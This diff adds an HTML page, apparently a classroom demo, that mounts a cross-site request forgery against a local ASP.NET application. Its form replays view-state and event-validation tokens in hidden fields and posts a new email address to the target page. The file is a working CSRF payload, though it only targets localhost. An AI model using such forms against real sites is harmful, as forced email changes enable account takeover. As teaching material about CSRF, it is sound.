@@ -1,0 +1,17 @@
+﻿<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <title>CSRF Demo Attack Application</title>
+</head>
+<body>
+    <h1>CSRF Demo Attack Application</h1>
+    <form method="post" action="http://localhost:51161/Default.aspx">
+        <input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
+        <input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
+        <input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="ut+gYjFEvxn22lNbyTuG9AfStGgjx7jxxmqke2EUGlONsXQ04G84otvyJCtM4wu0g9DjlcV0NPG/4J0hnv3bYGLyakD+TXRWsm5YOLXflNbDO3MM21U9ssZaI9TTsMM/" />
+        <input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="lzphf4bzcWf2wgmHP4Dzv7YZhCV8JQ9Gda+W78mUsaFAvsPOPsN0+UQRGkkUue5TsExJe5KmaxeRuqwPO4Zvvbl8BGqS71z87u296wGvEG22u7VqrVBN8jlUzzAXfo5I242B5j9dL1eE6G27bjTsfA==" />
+        <input type="hidden" name="NewEmailTextBox" id="NewEmailTextBox" value="new@email.com" />
+        <input type="submit" name="ButtonActionFormSubmit" value="Submit" id="ButtonActionFormSubmit" />
+    </form>
+</body>
+</html>
